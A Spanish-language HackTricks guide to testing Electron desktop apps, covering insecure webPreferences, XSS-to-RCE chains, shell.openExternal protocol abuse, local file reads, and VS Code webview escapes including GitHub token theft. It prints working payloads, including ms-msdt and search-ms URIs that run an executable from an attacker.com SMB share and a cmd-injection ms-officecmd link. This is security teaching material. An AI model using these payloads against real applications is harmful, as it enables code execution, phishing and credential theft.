# Aplicaciones de escritorio Electron

{{#include ../../banners/hacktricks-training.md}}

## Introducción

Electron combina un proceso principal **Node.js** privilegiado con procesos renderer de **Chromium**. Electron no es un navegador web: el código de la aplicación puede exponer deliberadamente capacidades como el acceso al sistema de archivos y al shell, por lo que cargar contenido no confiable requiere diseñar límites más estrictos que los de un sitio web convencional.<sup>[[21]](#references)</sup>

El código de las aplicaciones Electron suele empaquetarse en un archivo `.asar`. Extráelo antes de revisar el código fuente:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

El `package.json` de la aplicación identifica su punto de entrada principal. Ese archivo suele crear ventanas de renderer y definir sus `webPreferences`, que son sensibles desde el punto de vista de la seguridad.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron tiene dos tipos principales de procesos:

- Proceso principal (tiene acceso completo a NodeJS)
- Proceso de renderizado (debería tener acceso restringido a NodeJS por motivos de seguridad)

![Aplicaciones de escritorio Electron - Introducción: Proceso de renderizado (debería tener acceso restringido a NodeJS por motivos de seguridad)](<../../images/image (182).png>)

Un **proceso de renderizado** será una ventana del navegador que carga un archivo:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

El **main process** configura cada proceso renderer, normalmente al construir un `BrowserWindow`. Los ajustes seguros reducen la posibilidad de que el compromiso de un renderer permita ejecutar código nativo, pero no hacen que el contenido no confiable sea intrínsecamente seguro.<sup>[[21]](#references)[[22]](#references)</sup>

Revisa al menos estas preferencias del renderer:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** es `false` de forma predeterminada. Activarlo da acceso al JavaScript del renderer a las API de Node.js y también desactiva el sandbox de ese renderer.
- **`contextIsolation`** es `true` de forma predeterminada. Separa el contexto de JavaScript de la página del contexto que usan los scripts preload y los componentes internos de Electron.
- **`preload`** no tiene una ruta predeterminada. Un script preload configurado se ejecuta antes que los scripts de la página y puede exponer API de alcance limitado mediante `contextBridge`.
- **`sandbox`** es `true` de forma predeterminada desde Electron 20. Restringe el acceso del renderer a los recursos del sistema operativo; establecer `nodeIntegration: true` lo desactiva.
- **`nodeIntegrationInWorker`** es `false` de forma predeterminada y controla la integración de Node.js en Web Workers.
- **`nodeIntegrationInSubFrames`** es `false` de forma predeterminada.
  - Si **`nodeIntegration`** está **activado**, esto permitiría usar **API de Node.js** en páginas web **cargadas en iframes** dentro de una aplicación Electron.
  - Si **`nodeIntegration`** está **desactivado**, los scripts preload se cargarán en el iframe.

Ejemplo de configuración:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Algunos **RCE payloads** de [aquí](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Capturar tráfico

Modifica la configuración de start-main y añade el uso de un proxy como:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Trazado estático de la frontera entre ASAR y código nativo con REA

**REA** puede leer un ASAR o un directorio de aplicación extraído sin ejecutar su bootstrap de JavaScript. Su grafo de aplicación registra los puntos de entrada de los paquetes, los módulos empaquetados, la configuración de `BrowserWindow` y preload, los miembros de `contextBridge`, los registros de IPC, las solicitudes de complementos nativos y las identidades de los mapas de origen. Esto proporciona un punto de partida para rastrear una capacidad expuesta al renderer hasta un manejador privilegiado del proceso principal.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Para una cadena de característica literal, pasa el registro Evidence completo como `application` y sustituye la seed por una observada en el objetivo:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

El mismo flujo de trabajo `trace_application_feature` también acepta como semilla un miembro literal de API, un canal IPC o un módulo observado. Comprueba la ruta del handler resultante, los candidatos de validación y la transferencia al código nativo comparándolos con las ubicaciones de código fuente devueltas. Un `invoke` del renderer solo se empareja con un único candidato `ipcMain.handle`/`handleOnce` en el mismo canal literal exacto; de forma similar, `send` requiere un único candidato `ipcMain.on`/`once`/`addListener`. Los handlers dinámicos o duplicados quedan sin resolver. Un miembro `.node` solicitado no es una exportación nativa verificada; la evidencia coincidente de Hopper/Ghidra debe tener el mismo digest del artefacto antes de llegar a esa conclusión. La alcanzabilidad estática tampoco demuestra que la ruta se haya ejecutado.<sup>[[24]](#references)[[25]](#references)</sup>

Para el límite de confianza entre renderer y main, así como la validación del handler, consulta [RCE de Electron contextIsolation vía IPC](electron-contextisolation-rce-via-ipc.md).

Para el análisis nativo posterior vinculado al proveedor, consulta [Herramientas de reversing y métodos básicos](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Superficie de ataque de la actualización automática de Electron

Para consultar la integridad del feed de versiones, la reversión, la confusión de canales firmados y TOCTOU en archivos de staging, consulta [Límites de confianza de la actualización automática de Electron](electron-auto-update-trust-boundaries.md).

## Inyección de código local en Electron

Si tienes acceso de escritura local o de instrumentación a una aplicación instalada, consulta [Inyección de código local en Electron y manipulación de snapshots](electron-local-code-injection-and-snapshot-tampering.md) para conocer las rutas de ASAR/main process y de los snapshots de V8, además de los enlaces específicos del sistema operativo.

## RCE: XSS + nodeIntegration

Si **nodeIntegration** está configurado en **on**, el JavaScript de una página web puede usar fácilmente las funciones de Node.js con solo llamar a `require()`. Por ejemplo, para ejecutar la aplicación calc en Windows:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

El script indicado en esta configuración se c**arga antes que otros scripts en el renderer**, por lo que tiene **acceso ilimitado a las API de Node**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Por lo tanto, el script puede exportar node-features a páginas:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Si `contextIsolation` está activado, esto no funcionará**

## RCE: XSS + contextIsolation

_**contextIsolation**_ introduce **contextos separados entre los scripts de la página web y el código interno de JavaScript de Electron**, de modo que la ejecución de JavaScript de cada código no afecta al otro. Esta es una característica necesaria para eliminar la posibilidad de RCE.

Si los contextos no están aislados, un atacante puede:

1. Ejecutar **JavaScript arbitrario en el renderer** (XSS o navegación a sitios externos)
2. **Sobrescribir el método integrado** que se usa en el código preload o interno de Electron con una función propia
3. **Activar** el uso de la **función sobrescrita**
4. ¿RCE?

Hay 2 lugares donde se pueden sobrescribir los métodos integrados: en el código preload o en el código interno de Electron:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Omitir el evento de clic

Si se aplican restricciones al hacer clic en un enlace, podrías omitirlas **haciendo clic con el botón central** en lugar de hacer clic con el botón izquierdo habitual.

```javascript
window.addEventListener('click', (e) => {
```

## RCE vía shell.openExternal

Para obtener más información sobre estos ejemplos, consulta [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) y [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Al implementar una aplicación de escritorio Electron, es fundamental asegurarse de que `nodeIntegration` y `contextIsolation` estén configurados correctamente. Se sabe que estas configuraciones impiden eficazmente la ejecución remota de código (RCE) del lado del cliente dirigida a los scripts preload o al código nativo de Electron desde el proceso principal.

Cuando un usuario interactúa con enlaces o abre ventanas nuevas, se activan listeners de eventos específicos, fundamentales para la seguridad y el funcionamiento de la aplicación:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Estos listeners son **sobrescritos por la aplicación de escritorio** para implementar su propia **lógica de negocio**. La aplicación evalúa si un enlace al que se ha navegado debe abrirse internamente o en un navegador web externo. Esta decisión suele tomarse mediante una función, `openInternally`. Si esta función devuelve `false`, indica que el enlace debe abrirse externamente mediante la función `shell.openExternal`.

**Aquí tienes un pseudocódigo simplificado:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Las prácticas recomendadas de seguridad de Electron JS desaconsejan aceptar contenido no confiable con la función `openExternal`, ya que podría provocar RCE mediante varios protocolos. Los sistemas operativos admiten distintos protocolos que podrían desencadenar RCE. Para ver ejemplos detallados y obtener más información sobre este tema, consulta [este recurso](https://positive.security/blog/url-open-rce#windows-10-19042), que incluye ejemplos de protocolos de Windows capaces de explotar esta vulnerabilidad.<sup>[[10]](#references)</sup>

En macOS, se puede explotar la función `openExternal` para ejecutar comandos arbitrarios, como en `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Algunos ejemplos de exploits de protocolos de Windows son:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Esta vulnerabilidad se puede encontrar en **[este informe](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

**webviewTag** es una **función obsoleta** que permite usar **NodeJS** en el **proceso renderer**. Debería estar deshabilitada, ya que permite cargar un script en el contexto preload, como:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Por lo tanto, un atacante que consiga cargar una página arbitraria podría usar esa etiqueta para **cargar un script preload arbitrario**.

Luego se abusó de este script preload para llamar a un **servicio IPC vulnerable (`skype-new-window`)** que llamaba a **`shell.openExternal`** para obtener RCE:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Lectura de archivos internos: XSS + contextIsolation

**Deshabilitar `contextIsolation` permite usar etiquetas `<webview>`**, similares a `<iframe>`, para leer y exfiltrar archivos locales. Un ejemplo muestra cómo explotar esta vulnerabilidad para leer el contenido de archivos internos:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Lectura de archivos internos: XSS + contextIsolation: Deshabilitar contextIsolation permite usar etiquetas , similares a , para...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Además, se comparte otro método para **leer un archivo interno**, que destaca una vulnerabilidad crítica de lectura de archivos locales en una aplicación de escritorio Electron. Este método consiste en inyectar un script para explotar la aplicación y exfiltrar datos:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Chromium antiguo**

Si la versión de **Chromium** incluida con la aplicación es antigua y tiene vulnerabilidades conocidas, es posible que se pueda explotar y convertir el XSS en RCE.<sup>[[20]](#references)</sup>\
Puedes ver un ejemplo en este **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **Phishing mediante XSS a través de una omisión de la regex de URL interna**

Si encuentras XSS pero **no puedes desencadenar RCE ni robar archivos internos**, aun así podrías intentar **robar credenciales mediante phishing**.<sup>[[1]](#references)</sup>

Primero, inspecciona el código del frontend para determinar qué ocurre cuando se abre una URL nueva:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

La llamada a **`openInternally`** determina si un enlace de plataforma se abre en la **ventana de escritorio** o si un recurso de terceros se abre en el navegador del sistema.

Si se puede eludir la regex de allowlist de URL de la función —por ejemplo, porque no se escaparon los puntos de un nombre de host—, un atacante podría aprovechar XSS para abrir un aviso de credenciales convincente en una infraestructura bajo su control:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## Protocolo `file://`

Como se menciona en [la guía de seguridad de Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), las páginas que se ejecutan con **`file://`** tienen amplio acceso a los archivos. Por lo tanto, **XSS puede servir para cargar archivos arbitrarios** del equipo del usuario. Un **protocolo personalizado** diseñado correctamente puede restringir el acceso a un conjunto específico de archivos.<sup>[[21]](#references)</sup>

## Módulo `remote`

El módulo Remote de Electron permite que **los procesos renderer accedan a las API del proceso main**, facilitando la comunicación dentro de una aplicación Electron. Sin embargo, habilitar este módulo introduce importantes riesgos de seguridad. Amplía la superficie de ataque de la aplicación y la hace más susceptible a vulnerabilidades como los ataques de cross-site scripting (XSS).

> [!TIP]
> Aunque el módulo **remote** expone algunas API de los procesos main a los procesos renderer, no es tan sencillo obtener RCE abusando únicamente de estos componentes. Sin embargo, los componentes podrían exponer información confidencial.

> [!WARNING]
> Muchas aplicaciones que todavía usan el módulo remote lo hacen de una forma que **requiere que NodeIntegration esté habilitado** en el proceso renderer, lo cual representa un **enorme riesgo de seguridad**.

El módulo `remote` integrado de Electron quedó obsoleto y luego se eliminó; las aplicaciones que todavía necesitan ese modelo pueden usar el paquete independiente `@electron/remote`. Debido a las implicaciones de seguridad y rendimiento, evita exponer capacidades de tipo remote a procesos renderer no confiables.

Con `@electron/remote`, primero debe **inicializarse en el proceso main**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

El proceso de renderizado puede entonces importar objetos del módulo:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

La **[entrada del blog](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** indica algunas **funciones** interesantes expuestas por el objeto **`app`** del módulo remote:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Reinicia** la aplicación al **salir** de la instancia actual e **iniciar** una nueva. Es útil para **actualizaciones de la aplicación** o **cambios de estado** importantes.
- **`app.setAppLogsPath([path])`**  
   - **Define** o **crea** un directorio para almacenar los **registros de la aplicación**. Los registros se pueden **recuperar** o **modificar** mediante **`app.getPath()`** o **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Registra** el ejecutable actual como **gestor predeterminado** de un **protocolo** especificado. Si es necesario, puedes proporcionar una **ruta personalizada** y **argumentos**.
- **`app.setUserTasks(tasks)`**  
   - **Añade** tareas a la **categoría Tasks** de la **Jump List** (en Windows). Cada tarea puede controlar cómo se **inicia** la aplicación o qué **argumentos** se pasan.
- **`app.importCertificate(options, callback)`**  
   - **Importa** un **certificado PKCS#12** al **almacén de certificados** del sistema (solo Linux). Se puede usar un **callback** para gestionar el resultado.
- **`app.moveToApplicationsFolder([options])`**  
   - **Mueve** la aplicación a la **carpeta Applications** (en macOS). Ayuda a garantizar una **instalación estándar** para los usuarios de Mac.
- **`app.setJumpList(categories)`**  
   - **Establece** o **elimina** una **Jump List personalizada** en **Windows**. Puedes especificar **categorías** para organizar cómo se muestran las tareas al usuario.
- **`app.setLoginItemSettings(settings)`**  
   - **Configura** qué **ejecutables** se inician al **iniciar sesión**, junto con sus **opciones** (solo macOS y Windows).
  
Ejemplo:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## Módulo systemPreferences

La **API principal** para acceder a las preferencias del sistema y **emitir eventos del sistema** en Electron. Métodos como **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** y **setUserDefault** forman **parte de** este módulo.

**Ejemplo de uso:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Escucha** las **notificaciones nativas de macOS** mediante NSDistributedNotificationCenter.  
* Antes de **macOS Catalina**, se podían interceptar **todas** las notificaciones distribuidas pasando **nil** a CFNotificationCenterAddObserver.  
* Después de **Catalina / Big Sur**, las aplicaciones en sandbox aún pueden **suscribirse** a **muchos eventos** (por ejemplo, **bloqueos/desbloqueos de pantalla**, **montajes de volúmenes**, **actividad de red**, etc.) registrando notificaciones **por nombre**.

### **getUserDefault / setUserDefault**

* **Interactúa** con **NSUserDefaults**, que almacena preferencias **de aplicaciones** o **globales** en macOS.
    
* **getUserDefault** puede **recuperar** información sensible, como **ubicaciones de archivos recientes** o la **ubicación geográfica del usuario**.
    
* **setUserDefault** puede **modificar** estas preferencias, lo que podría afectar la **configuración** de una aplicación.
    
* En **versiones anteriores de Electron** (antes de la v8.3.0), solo era **accesible** el **conjunto estándar** de NSUserDefaults.

## Shell.showItemInFolder

Esta función muestra el archivo indicado en un administrador de archivos. En las plataformas y versiones afectadas, esa interacción **podía ejecutar automáticamente el archivo**.

Para obtener más información, consulta [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Las aplicaciones de Electron deberían tener una **Content Security Policy (CSP)** para **prevenir ataques XSS**. La **CSP** es un **estándar de seguridad** que ayuda a **prevenir** la **ejecución** de **código no confiable** en el navegador.

Normalmente se **configura** en el archivo **`main.js`** o en la plantilla **`index.html`**, con la CSP dentro de una **meta tag**.

Para obtener más información, consulta:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

Esta cadena del mundo real afectó a Visual Studio Code 1.63 (CVE-2021-43908) y demuestra cómo una sola XSS provocada por Markdown en un webview puede escalarse a una RCE completa cuando CSP, postMessage y los handlers de esquemas están mal configurados. PoC pública: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Resumen de la cadena de ataque
- Primera XSS mediante CSP del webview: La CSP generada incluía `style-src 'self' 'unsafe-inline'`, lo que permitía inyecciones basadas en estilos/inline en un contexto `vscode-webview://`. El payload enviaba un beacon a `/stealID` para exfiltrar el extensionId del webview objetivo.
- Construcción de la URL del webview objetivo: Se usó el ID filtrado para crear `vscode-webview://<extensionId>/.../<publicUrl>`.
- Segunda XSS mediante confianza en postMessage: El webview externo confiaba en `window.postMessage` sin comprobaciones estrictas del origen ni del tipo y cargaba HTML del atacante con `allowScripts: true`.
- Carga de archivos locales mediante reescritura de esquema/ruta: El payload reescribía `file:///...` como `vscode-file://vscode-app/...` y sustituía `exploit.md` por `RCE.html`, aprovechando una validación débil de rutas para cargar un recurso local privilegiado.
- RCE en un contexto con Node habilitado: El HTML cargado se ejecutaba con las API de Node disponibles, lo que permitía ejecutar comandos del sistema operativo.

Ejemplo de primitiva de RCE en el contexto final
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Lectura relacionada sobre problemas de confianza de postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: atajos sintéticos de webview + puentes declarativos de comandos de extensiones

En junio de 2026 apareció una clase distinta de escape de webview de VS Code: **JavaScript no confiable dentro de un webview de notebook/preview podía sintetizar atajos globales privilegiados**, porque el preload del webview reenviaba los datos de `keydown` al workbench anfitrión y este los procesaba como si fueran entradas reales del usuario.<sup>[[14]](#references)</sup>

Esto forma parte de una historia más amplia de ataques a los límites de confianza de los IDE, en los que contenido controlado por el proyecto llega a funciones privilegiadas del editor.<sup>[[19]](#references)</sup>

### Fallo del límite de seguridad

Si un webview cross-origin/sandboxed copia campos de teclado controlados por un atacante (`key`, `code`, `keyCode`, modificadores, `repeat`) a un puente privilegiado de `postMessage`/message-port **sin comprobar `event.isTrusted`**, JavaScript dentro del webview puede ejecutar atajos del workbench con:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Esto es especialmente útil cuando el navegador **bloquea la escritura sintética**. Los eventos de teclas programados normalmente **no pueden escribir texto arbitrario en elementos HTML `<input>`**, pero aun así activan atajos que procesan directamente `keydown`.

### Patrones de abuso prácticos

- **Abuso de la interfaz orientado a atajos:** apuntar a combinaciones globales, como aceptar notificaciones, navegar por paletas, activar botones enfocados o moverse por menús, en lugar de intentar escribir comandos.
- **Solicitudes privilegiadas predecibles a partir de metadatos del workspace:** un `.vscode/extensions.json` controlado por un repositorio puede recomendar una extensión del atacante y generar una notificación predecible de instalación que se puede aceptar con un atajo como `Ctrl+Shift+A`.
- **Manifiesto declarativo de extensión como puente de comandos:** aunque la CSP bloquee el código de extensiones del workspace local en web VS Code, es posible que las contribuciones declarativas de `package.json` sigan cargándose. Una extensión local en `.vscode/extensions` puede registrar una combinación de teclas que invoque `runCommands` y, después, un comando interno privilegiado como `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Ejemplo de patrón de manifiesto:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Flags de seguridad ocultos accesibles desde metadatos no confiables:** si el comando interno acepta argumentos controlados por un atacante, como `{"context":{"skipPublisherTrust":true}}`, los metadatos declarativos pueden suprimir un diálogo de confianza e instalar una extensión alojada en Marketplace/CDN que finalmente ejecuta código del atacante.
- **Abuso de espacios de trabajo de confianza:** si los espacios de trabajo remotos/web se consideran de confianza automáticamente, las extensiones de espacios de trabajo locales se convierten en un puente de gran valor entre el contenido del repositorio y las acciones privilegiadas del editor.
- **Ampliación del alcance tras la vulneración:** después de ejecutar una extensión, inspecciona los tokens que el editor pone a disposición de las extensiones. En `github.dev`, el token de GitHub robado tenía validez más allá del repositorio abierto, por lo que consultar `https://api.github.com/user/repos` permitió enumerar otros repositorios privados accesibles.

### Notas de auditoría

- Trata el **reenvío de entrada de webview al host** como un límite de privilegios; nunca vuelvas a enviar eventos sintéticos de teclado/clic desde frames no confiables al host.
- Aplica la autorización **dentro** de los comandos sensibles. No aceptes un contexto de comando proporcionado por quien lo invoca que pueda establecer flags internos como `skipPublisherTrust`.
- No des por hecho que bloquear el código ejecutable de extensiones locales es suficiente; revisa también las **contribuciones declarativas** (`keybindings`, `menus`, `commands`, tareas) de los manifiestos controlados por el espacio de trabajo.
- Las correcciones del 3 de junio de 2026 añadieron `isTrusted` a los eventos reenviados, desactivaron el reenvío de teclas no confiables en webviews de notebooks y dejaron de aceptar el contexto del comando de instalación proporcionado por quien lo invoca.<sup>[[16]](#references)[[17]](#references)</sup>

## **Herramientas**

La colección seleccionada **awesome-electronjs-hacking** ofrece recursos adicionales de investigación, herramientas y aplicaciones vulnerables.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) es una herramienta para identificar configuraciones incorrectas y patrones anti-seguridad en aplicaciones basadas en Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) es un plugin de código abierto para VS Code destinado a aplicaciones Electron que utiliza Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) comprueba si hay bibliotecas de terceros vulnerables.
- [**Electro.ng**](https://electro.ng/) es una herramienta comercial de análisis de seguridad para Electron.

## Laboratorios

En [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) encontrarás un laboratorio para explotar aplicaciones Electron vulnerables.<sup>[[4]](#references)</sup>

Estos comandos te ayudarán a completar el laboratorio:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Dirección publicada anteriormente para los marcadores existentes: [Aplicaciones de escritorio Electron](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). La ruta de la página completa redirige aquí; el fragmento histórico no se mantiene.

## References

- [1] [Phishing y recolección de credenciales en aplicaciones Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Lectura arbitraria de archivos en la aplicación de escritorio Facebook Messenger](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: abuso de la falta de aislamiento de contexto - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Taller de hacking de aplicaciones de escritorio modernas con XSS y RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking: una lista seleccionada de recursos sobre la (in)seguridad de Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Uso indebido de las API de Electron: la primera opción de un atacante](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Payloads de RCE de Electron nodeIntegration](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE con un clic en aplicaciones Electron](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Los peligros de shell.openExternal() de Electron: muchas vías para la ejecución remota de código](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Permite URL arbitrarias y espera la ejecución de código arbitrario](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Cómo lograr RCE en una famosa herramienta de chat japonesa con una función obsoleta de Electron](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop: ejecución remota de código](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code: ejecución remota de código en modo restringido (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Robo de tokens de GitHub con un clic mediante la inyección de eventos de teclado en VS Code Webview](https://blog.ammaraskar.com/github-token-stealing)
- [15] [Problema n.º 319593 de VS Code: los Webviews pueden activar atajos de teclado arbitrarios en el workbench principal](https://github.com/microsoft/vscode/issues/319593)
